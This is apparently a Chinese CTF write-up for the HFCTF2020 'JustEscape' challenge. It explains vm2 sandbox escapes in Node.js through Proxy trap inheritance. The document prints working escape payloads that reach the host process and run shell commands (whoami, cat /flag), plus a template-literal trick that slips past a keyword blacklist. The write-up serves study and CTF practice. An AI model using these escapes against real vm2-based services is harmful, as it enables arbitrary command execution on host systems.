# [HFCTF2020]JustEscape

## 0、知识点

>   vm2沙盒逃逸

>   vm2能让用户在可控的范围和权限内发挥想象做一些好玩、有用的事情，扩展能力，满足用户的个性化需求

## 1、关于vm2

-   它是npm中的一个库也是**vm**的代替品，它是一个简单**沙箱环境（虚拟的）**，

    -   vm库：Node.js官方标准库中的vm库，用来在V8虚拟机环境中编译执行JS代码
    -   vm2库：它是vm库的升级版，专门为了解决vm的安全问题而诞生的

-   没有`require`功能，可以**同步运行不受信任的代码**，也就是在代码主程序之外**执行额外的js代码**

    -   不安全的原因：**用户可以通过额外的代码直接操作控制主程序**

-   vm2基于vm，使用官方的vm库构建沙箱环境。

    -   **然后使用JavaScript的Proxy技术来防止沙箱脚本逃逸。**

    ****

### 1、关于Proxy

es6 proxy的知识：https://es6.ruanyifeng.com/?search=weakmap&x=0&y=0#docs/proxy

```js
var handler = {
	get () {
		console.log("get");
	}
};
var target = {};
// 生成一个proxy实例
// targer：表示所要拦截的目标对象，如果为空表示任何访问都要走handle
// handle：用来定制拦截行为，如果handler没有设置任何拦截，那就等同于直接通向原对象。
var proxy = new Proxy(target, handler);

Object.prototype.has = function(){
	console.log("has");
}

proxy.a; //触发get
"" in proxy; //触发has，这个has是在原型链上定义的
```

>   在对象 `target` 上定义了 `get` 操作，会拦截对象属性的读取，所以当访问 `proxy.a` 时，会打印出 `get`

>   但是当执行 `"" in proxy` 时，也会被 `has`方法拦截，
>
>   此时，虽然没有直接在 `target` 对象上定义 `has` 拦截操作，即代理的方法是可以被继承的。

**vm2中实际运行的代码如下：**

```js
"use strict";

var process;

Object.prototype.has = function (t, k) {
    process = t.constructor("return process")();
};

"" in Buffer.from;
process.mainModule.require("child_process").execSync("whoami").toString()
```

>   `Buffer.from` 是一个代理对象，vm2的作者一开始并没有给vm2内部的Object 加上 has方法，
>
>   所以我们可以自己给 `Object` 对象的原型上添加 `has` 方法，这时候运行`"" in Buffer.from;`
>
>   就会去执行我们定义好的`has`方法，由于 `proxy` 的机制，参数 `t` 是 `function Buffer.from` ，这个`function`是在外部的，其上下文是` nodejs 的global下`，所以访问其 `constructor` 属性就获取到了外部的 `Function`，从而拿到外部的 `process`
>
>   而开发者的修复方案：添加上 has 方法，没有修复之前，`Buffer.from` 是没有拦截 `has` 操作的，
>
>   而修复之后：由于 `Buffer.from` 中已经存在了 has 方法，所以不会去原型链上查找







## 解题

GitHub上有写出漏洞playload：https://github.com/patriksimek/vm2/issues/225，拿过来改造一下就可以使用

```js
"use strict";
const {VM} = require('vm2');
const untrusted = '(' + function(){
	TypeError.prototype.get_process = f=>f.constructor("return process")();
	try{
		Object.preventExtensions(Buffer.from("")).a = 1;
	}catch(e){
		return e.get_process(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
	}
}+')()';
try{
	console.log(new VM().run(untrusted));
}catch(x){
	console.log(x);
}
```

**被过滤的参数**

```c
['for', 'while', 'process', 'exec', 'eval', 'constructor', 'prototype', 'Function', '+', '"',''']
 
 【""】被过滤可使用【``】符号代替，
	如：`${`x`}y` = xy，而单独使用`${x}`则是将x作为一个变量引入
```

**在原有的playload进行改造一下**

```js
(function (){
    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
    try{
        Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
    }
})()

```





参考：
https://segmentfault.com/a/1190000012672620

https://www.anquanke.com/post/id/207291

https://www.cnblogs.com/c0d1/p/16073632.html